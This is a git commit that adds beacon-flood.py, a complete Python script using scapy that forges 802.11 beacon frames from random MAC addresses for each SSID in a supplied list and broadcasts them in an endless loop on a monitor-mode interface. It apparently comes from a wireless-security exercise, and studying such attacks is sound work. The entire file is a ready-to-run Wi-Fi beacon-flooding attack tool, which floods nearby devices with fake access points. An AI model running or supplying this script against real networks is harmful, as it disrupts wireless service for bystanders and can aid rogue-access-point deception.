05bf9f06350d2a872fc3d5cc280fb224d0ac53a7
Z00Honey <wngjsdl123@naver.com>
2023-01-17 01:19:17 +0900

    Create beacon-flood.py

---
+++ beacon-flood.py
@@ -0,0 +1,61 @@
+from scapy.all import Dot11,Dot11Beacon,Dot11Elt,RadioTap,sendp,hexdump,RandMAC
+import sys
+import random
+import os
+from faker import Faker
+
+# How to use
+def usage():
+    print("syntax : python3 beacon-flood.py <interface> <ssid-list-file>")
+    print("sample : python3 beacon-flood.py mon0 ssid-list.txt")
+
+
+def ssid_list():
+    f = open(sys.argv[2],'r')
+    ssid = []
+    while True:
+        line = f.readline()
+        if not line: 
+            break
+        ssid.append(line)
+    f.close()
+    return ssid
+
+    
+def make_frame(ssids):
+    frames =[]
+    faker = Faker()
+
+    for netSSID in ssids:
+        sender = faker.mac_address()
+        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2=sender, addr3=sender)
+        beacon = Dot11Beacon(cap='ESS+privacy')
+        essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
+        frame = RadioTap()/dot11/beacon/essid
+        frames.append(frame)
+        print("---------------------------------------------------------------------------------------")
+        print("SSID="+netSSID[:-1]+" :",end=' ')
+        print("add1="+frame.addr1,end=' | ')
+        print("add2="+frame.addr2,end=' | ')
+        print("add3="+frame.addr3)
+    print("---------------------------------------------------------------------------------------")
+
+    return frames
+
+
+# Check Parameter
+if len(sys.argv) != 3:
+    usage()
+    sys.exit()
+
+# Read file for make ssid list
+ssids = ssid_list()
+
+# Set Interface
+iface = sys.argv[1]
+
+# Make Beacon Frame
+frames = make_frame(ssids)
+
+# Beacon Flooding
+sendp(frames, iface=iface, inter=0.0100, loop=1,verbose=0)
